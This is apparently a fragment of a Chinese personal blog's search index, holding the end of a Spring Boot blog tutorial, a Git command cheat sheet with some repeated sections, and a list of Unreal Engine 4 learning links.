class="headerlink" title="个人模块处理"></a>个人模块处理</h3><p>AboutShowController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AboutShowController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/about&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">about</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;about&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>messages.properties</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">index.email</span>=<span class="string">Email: 2644266656@qq.com</span></span><br><span class="line"><span class="meta">index.qq</span>=<span class="string">QQ: 2644266656</span></span><br><span class="line"><span class="meta">index.tagcontext</span>=<span class="string">南有孤岛北有亡梦，南柯一梦终是虚无。</span></span><br><span class="line"><span class="meta">index.titlename</span>=<span class="string">Guest Island</span></span><br><span class="line"><span class="meta">index.kor</span>=<span class="string">Copyright &amp;copy; 2020-2021 Guest Island Personal blog</span></span><br><span class="line"><span class="meta">blog.serurl</span>=<span class="string">127.0.0.1:8080</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 教学文档 </tag>
            
            <tag> 程序开发 </tag>
            
            <tag> Spring </tag>
            
            <tag> 博客网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git指令讲解</title>
      <link href="/2021/08/29/Git/"/>
      <url>/2021/08/29/Git/</url>
      
        <content type="html"><![CDATA[<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">查看、添加、提交、删除、找回，重置修改文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">help</span> <span class="string">&lt;command&gt;</span> <span class="comment"># 显示command的help</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">show</span> <span class="comment"># 显示某次提交的内容 git show $id</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">--</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 抛弃工作区修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">.</span> <span class="comment"># 抛弃工作区修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">add</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 将工作文件修改提交到本地暂存区</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span> <span class="comment"># 将所有修改过的工作文件提交暂存区</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rm</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 从版本库中删除文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rm</span> <span class="string">&lt;file&gt;</span> <span class="string">--cached</span> <span class="comment"># 从版本库中删除文件，但不删除文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 从暂存区恢复到工作文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">--</span> <span class="string">.</span> <span class="comment"># 从暂存区恢复到工作文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">--hard</span> <span class="comment"># 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">ci</span> <span class="string">&lt;file&gt;</span> <span class="string">git</span> <span class="string">ci</span> <span class="string">.</span> <span class="string">git</span> <span class="string">ci</span> <span class="string">-a</span> <span class="comment"># 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am &quot;some comments&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">ci</span> <span class="string">--amend</span> <span class="comment"># 修改最后一次提交记录</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">revert</span> <span class="string">&lt;$id&gt;</span> <span class="comment"># 恢复某次提交的状态，恢复动作本身也创建次提交对象</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">revert</span> <span class="string">HEAD</span> <span class="comment"># 恢复最后一次提交的状态</span></span><br><span class="line"></span><br><span class="line"> <span class="string">查看文件diff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">help</span> <span class="string">&lt;command&gt;</span> <span class="comment"># 显示command的help</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">show</span> <span class="comment"># 显示某次提交的内容 git show $id</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">--</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 抛弃工作区修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">.</span> <span class="comment"># 抛弃工作区修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">add</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 将工作文件修改提交到本地暂存区</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span> <span class="comment"># 将所有修改过的工作文件提交暂存区</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rm</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 从版本库中删除文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rm</span> <span class="string">&lt;file&gt;</span> <span class="string">--cached</span> <span class="comment"># 从版本库中删除文件，但不删除文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 从暂存区恢复到工作文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">--</span> <span class="string">.</span> <span class="comment"># 从暂存区恢复到工作文件</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">reset</span> <span class="string">--hard</span> <span class="comment"># 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">ci</span> <span class="string">&lt;file&gt;</span> <span class="string">git</span> <span class="string">ci</span> <span class="string">.</span> <span class="string">git</span> <span class="string">ci</span> <span class="string">-a</span> <span class="comment"># 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am &quot;some comments&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">ci</span> <span class="string">--amend</span> <span class="comment"># 修改最后一次提交记录</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">revert</span> <span class="string">&lt;$id&gt;</span> <span class="comment"># 恢复某次提交的状态，恢复动作本身也创建次提交对象</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">revert</span> <span class="string">HEAD</span> <span class="comment"># 恢复最后一次提交的状态</span></span><br><span class="line"></span><br><span class="line"> <span class="string">查看提交记录</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">log</span> <span class="string">git</span> <span class="string">log</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 查看该文件每次提交记录</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">log</span> <span class="string">-p</span> <span class="string">&lt;file&gt;</span> <span class="comment"># 查看每次详细修改内容的diff</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">log</span> <span class="string">-p</span> <span class="number">-2</span> <span class="comment"># 查看最近两次详细修改内容的diff</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">log</span> <span class="string">--stat</span> <span class="comment">#查看提交统计信息</span></span><br><span class="line"> <span class="string">tig</span></span><br><span class="line"></span><br><span class="line"> <span class="string">Mac上可以使用tig代替diff和log，brew</span> <span class="string">install</span> <span class="string">tig</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="string">Git</span> <span class="string">本地分支管理</span></span><br><span class="line"> <span class="string">查看、切换、创建和删除分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">-r</span> <span class="comment"># 查看远程分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">&lt;new_branch&gt;</span> <span class="comment"># 创建新的分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">-v</span> <span class="comment"># 查看各个分支最后提交信息</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">--merged</span> <span class="comment"># 查看已经被合并到当前分支的分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">--no-merged</span> <span class="comment"># 查看尚未被合并到当前分支的分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 切换到某个分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">-b</span> <span class="string">&lt;new_branch&gt;</span> <span class="comment"># 创建新的分支，并且切换过去</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">-b</span> <span class="string">&lt;new_branch&gt;</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 基于branch创建新的new_branch</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">$id</span> <span class="comment"># 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">$id</span> <span class="string">-b</span> <span class="string">&lt;new_branch&gt;</span> <span class="comment"># 把某次历史提交记录checkout出来，创建成一个分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">-d</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 删除某个分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">br</span> <span class="string">-D</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 强制删除某个分支 (未被合并的分支被删除的时候需要强制)</span></span><br><span class="line"> <span class="string">分支合并和reba</span></span><br><span class="line"> <span class="string">git</span> <span class="string">merge</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 将branch分支合并到当前分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">merge</span> <span class="string">origin/master</span> <span class="string">--no-ff</span> <span class="comment"># 不要Fast-Foward合并，这样可以生成merge提交</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rebase</span> <span class="string">master</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;</span></span><br><span class="line"> <span class="string">Git补丁管理(方便在多台机器上开发同步时用)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">merge</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 将branch分支合并到当前分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">merge</span> <span class="string">origin/master</span> <span class="string">--no-ff</span> <span class="comment"># 不要Fast-Foward合并，这样可以生成merge提交</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">rebase</span> <span class="string">master</span> <span class="string">&lt;branch&gt;</span> <span class="comment"># 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="string">Git暂存管</span></span><br><span class="line"> <span class="string">git</span> <span class="string">stash</span> <span class="comment"># 暂存</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">stash</span> <span class="string">list</span> <span class="comment"># 列所有stash</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">stash</span> <span class="string">apply</span> <span class="comment"># 恢复暂存的内容</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">stash</span> <span class="string">drop</span> <span class="comment"># 删除暂存区</span></span><br><span class="line"></span><br><span class="line"> <span class="string">Git远程分支管理</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">pull</span> <span class="comment"># 抓取远程仓库所有分支更新并合并到本地</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">pull</span> <span class="string">--no-ff</span> <span class="comment"># 抓取远程仓库所有分支更新并合并到本地，不要快进合并</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">fetch</span> <span class="string">origin</span> <span class="comment"># 抓取远程仓库更新</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">merge</span> <span class="string">origin/master</span> <span class="comment"># 将远程主分支合并到本地当前分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">--track</span> <span class="string">origin/branch</span> <span class="comment"># 跟踪某个远程分支创建相应的本地分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">co</span> <span class="string">-b</span> <span class="string">&lt;local_branch&gt;</span> <span class="string">origin/&lt;remote_branch&gt;</span> <span class="comment"># 基于远程分支创建本地分支，功能同上</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="comment"># push所有分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">origin</span> <span class="string">master</span> <span class="comment"># 将本地主分支推到远程主分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">-u</span> <span class="string">origin</span> <span class="string">master</span> <span class="comment"># 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">origin</span> <span class="string">&lt;local_branch&gt;</span> <span class="comment"># 创建远程分支， origin是远程仓库名</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">origin</span> <span class="string">&lt;local_branch&gt;:&lt;remote_branch&gt;</span> <span class="comment"># 创建远程分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">origin</span> <span class="string">:&lt;remote_branch&gt;</span> <span class="comment">#先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">Git远程仓库管</span></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">-v</span> <span class="comment"># 查看远程服务器地址和仓库名称</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">show</span> <span class="string">origin</span> <span class="comment"># 查看远程服务器仓库状态</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">add</span> <span class="string">origin</span> <span class="string">git@</span> <span class="string">github:robbin/robbin_site.git</span> <span class="comment"># 添加远程仓库地址</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">set-url</span> <span class="string">origin</span> <span class="string">git@</span> <span class="string">github.com:robbin/robbin_site.git</span> <span class="comment"># 设置远程仓库地址(用于修改远程仓库地址) git remote rm &lt;repository&gt; # 删除远程仓库</span></span><br><span class="line"></span><br><span class="line"> <span class="string">创建远程仓库</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">clone</span> <span class="string">--bare</span> <span class="string">robbin_site</span> <span class="string">robbin_site.git</span> <span class="comment"># 用带版本的项目创建纯版本仓库</span></span><br><span class="line"></span><br><span class="line"> <span class="string">scp</span> <span class="string">-r</span> <span class="string">my_project.git</span> <span class="string">git@</span> <span class="string">git.csdn.net:~</span> <span class="comment"># 将纯仓库上传到服务器上</span></span><br><span class="line"></span><br><span class="line"> <span class="string">mkdir</span> <span class="string">robbin_site.git</span> <span class="string">&amp;&amp;</span> <span class="string">cd</span> <span class="string">robbin_site.git</span> <span class="string">&amp;&amp;</span> <span class="string">git</span> <span class="string">--bare</span> <span class="string">init</span> <span class="comment"># 在服务器创建纯仓库</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">add</span> <span class="string">origin</span> <span class="string">git@</span> <span class="string">github.com:robbin/robbin_site.git</span> <span class="comment"># 设置远程仓库地址</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">-u</span> <span class="string">origin</span> <span class="string">master</span> <span class="comment"># 客户端首次提交</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">push</span> <span class="string">-u</span> <span class="string">origin</span> <span class="string">develop</span> <span class="comment"># 首次将本地develop分支提交到远程develop分支，并且track</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">remote</span> <span class="string">set-head</span> <span class="string">origin</span> <span class="string">master</span> <span class="comment"># 设置远程仓库的HEAD指向master分支</span></span><br><span class="line"></span><br><span class="line"> <span class="string">也可以命令设置跟踪远程库和本地库</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">branch</span> <span class="string">--set-upstream</span> <span class="string">master</span> <span class="string">origin/master</span></span><br><span class="line"></span><br><span class="line"> <span class="string">git</span> <span class="string">branch</span> <span class="string">--set-upstream</span> <span class="string">develop</span> <span class="string">origin/develop</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> git </tag>
            
            <tag> 程序开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>散章（UE4）</title>
      <link href="/2021/08/29/San_Passage/"/>
      <url>/2021/08/29/San_Passage/</url>
      
        <content type="html"><![CDATA[<h3 id="其他教程集合："><a href="#其他教程集合：" class="headerlink" title="其他教程集合："></a>其他教程集合：</h3><ul><li><a href="https://blog.csdn.net/u012999985/article/details/107096741?spm=1001.2014.3001.5501">https://blog.csdn.net/u012999985/article/details/107096741?spm=1001.2014.3001.5501</a></li></ul><h3 id="蓝图入门："><a href="#蓝图入门：" class="headerlink" title="蓝图入门："></a>蓝图入门：</h3><ul><li><p>1.UE4序章：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100671944">https://blog.csdn.net/qq_42145322/article/details/100671944</a></p></li><li><p>2.UE4世界设置、输入控制、Tick事件、碰撞事件响应：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100671988">https://blog.csdn.net/qq_42145322/article/details/100671988</a></p></li><li><p>3.UE4材质：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100672016">https://blog.csdn.net/qq_42145322/article/details/100672016</a></p></li><li><p>4.UE4蓝图变量及其类型：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100611688">https://blog.csdn.net/qq_42145322/article/details/100611688</a></p></li><li><p>5.UE4蓝图枚举和结构体：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620667">https://blog.csdn.net/qq_42145322/article/details/100620667</a></p></li><li><p>6.UE4蓝图流程控制：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620744">https://blog.csdn.net/qq_42145322/article/details/100620744</a></p></li><li><p>7.UE4蓝图容器：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620784">https://blog.csdn.net/qq_42145322/article/details/100620784</a></p></li><li><p>8.UE4函数：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620837">https://blog.csdn.net/qq_42145322/article/details/100620837</a></p></li><li><p>9.UE4关卡蓝图：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620874">https://blog.csdn.net/qq_42145322/article/details/100620874</a></p></li><li><p>10.UE4蓝图编辑界面介绍：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620913">https://blog.csdn.net/qq_42145322/article/details/100620913</a></p></li><li><p>11.UE4蓝图宏：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620929">https://blog.csdn.net/qq_42145322/article/details/100620929</a></p></li><li><p>12.UE4蓝图接口：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100620976">https://blog.csdn.net/qq_42145322/article/details/100620976</a></p></li><li><p>13.UE4蓝图事件调度器：<br><a href="https://blog.csdn.net/qq_42145322/article/details/100621053">https://blog.csdn.net/qq_42145322/article/details/100621053</a></p></li></ul><h3 id="组件："><a href="#组件：" class="headerlink" title="组件："></a>组件：</h3><ul><li><p>缆绳组件：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/Basics/Components/Rendering/CableComponent/">https://docs.unrealengine.com/4.26/zh-CN/Basics/Components/Rendering/CableComponent/</a></p></li><li><p>Scene Capture 2D Component的使用：<br><a href="https://www.cnblogs.com/timy/p/10018848.html">https://www.cnblogs.com/timy/p/10018848.html</a></p></li><li><p>移动组件详解（一）——移动框架与实现原理：<br><a href="https://blog.csdn.net/u012999985/article/details/78669508">https://blog.csdn.net/u012999985/article/details/78669508</a></p></li><li><p>移动组件详解（二）——移动同步机制：<br><a href="https://blog.csdn.net/u012999985/article/details/78669947">https://blog.csdn.net/u012999985/article/details/78669947</a></p></li></ul><h3 id="物理："><a href="#物理：" class="headerlink" title="物理："></a>物理：</h3><ul><li><p>物理系统浅析：<br><a href="https://blog.csdn.net/zzx023/article/details/82871707">https://blog.csdn.net/zzx023/article/details/82871707</a></p></li><li><p>碰撞概述：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Overview/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Overview/</a></p></li><li><p>碰撞响应参考：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Reference/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/Physics/Collision/Reference/</a></p></li><li><p>在建模软件里自定义碰撞体积：<br><a href="https://blog.csdn.net/a359877454/article/details/53410749">https://blog.csdn.net/a359877454/article/details/53410749</a></p></li></ul><h3 id="AI："><a href="#AI：" class="headerlink" title="AI："></a>AI：</h3><ul><li><p>AI最简使用案例：<br><a href="https://gameinstitute.qq.com/community/detail/121929">https://gameinstitute.qq.com/community/detail/121929</a></p></li><li><p>1.行为树快速入门指南：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeQuickStart/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeQuickStart/</a></p></li><li><p>2.行为树概述：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreesOverview/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreesOverview/</a></p></li><li><p>3.行为树用户指南：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeUserGuide/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeUserGuide/</a></p></li><li><p>4.行为树节点参考：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/</a></p></li><li><p>5.复合节点：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceComposites/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceComposites/</a></p></li><li><p>6.装饰器节点：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceDecorators/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceDecorators/</a></p></li><li><p>7.服务节点：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceServices/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceServices/</a></p></li><li><p>8.任务节点：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceTasks/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/BehaviorTrees/BehaviorTreeNodeReference/BehaviorTreeNodeReferenceTasks/</a></p></li><li><p>9.场景查询系统快速入门：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSQuickStart/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSQuickStart/</a></p></li><li><p>10.场景查询系统概述：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSOverview/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSOverview/</a></p></li><li><p>11.场景查询系统用户指南：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSUserGuide/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSUserGuide/</a></p></li><li><p>12.场景查询系统节点参考：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/</a></p></li><li><p>13.EQS节点参考：生成器：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceGenerators/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceGenerators/</a></p></li><li><p>14.EQS节点参考：测试：<br><a href="https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceTests/">https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceTests/</a></p></li><li><p>Service、Task、Decorator节点重载函数介绍：<br><a href="https://blog.csdn.net/u010385624/article/details/89339958">https://blog.csdn.net/u010385624/article/details/89339958</a></p></li></ul><h3 id="Gameplay框架详细讲解："><a href="#Gameplay框架详细讲解：" class="headerlink" title="Gameplay框架详细讲解："></a>Gameplay框架详细讲解：</h3><ul><li><p>1.Actor和Component：<br><a href="https://zhuanlan.zhihu.com/p/22833151">https://zhuanlan.zhihu.com/p/22833151</a></p></li><li><p>2.Level和World：<br><a href="https://zhuanlan.zhihu.com/p/22924838">https://zhuanlan.zhihu.com/p/22924838</a></p></li><li><p>3.WorldContext，GameInstance，Engine：<br><a href="https://zhuanlan.zhihu.com/p/23167068">https://zhuanlan.zhihu.com/p/23167068</a></p></li><li><p>4.Pawn：<br><a href="https://zhuanlan.zhihu.com/p/23321666">https://zhuanlan.zhihu.com/p/23321666</a></p></li><li><p>5.Controller：<br><a href="https://zhuanlan.zhihu.com/p/23480071">https://zhuanlan.zhihu.com/p/23480071</a></p></li><li><p>6.PlayerController和AIController：<br><a href="https://zhuanlan.zhihu.com/p/23649987">https://zhuanlan.zhihu.com/p/23649987</a></p></li><li><p>7.GameMode和GameState：<br><a href="https://zhuanlan.zhihu.com/p/23707588">https://zhuanlan.zhihu.com/p/23707588</a></p></li><li><p>8.Player：<br><a href="https://zhuanlan.zhihu.com/p/23826859">https://zhuanlan.zhihu.com/p/23826859</a></p></li><li><p>9.GameInstance：<br><a 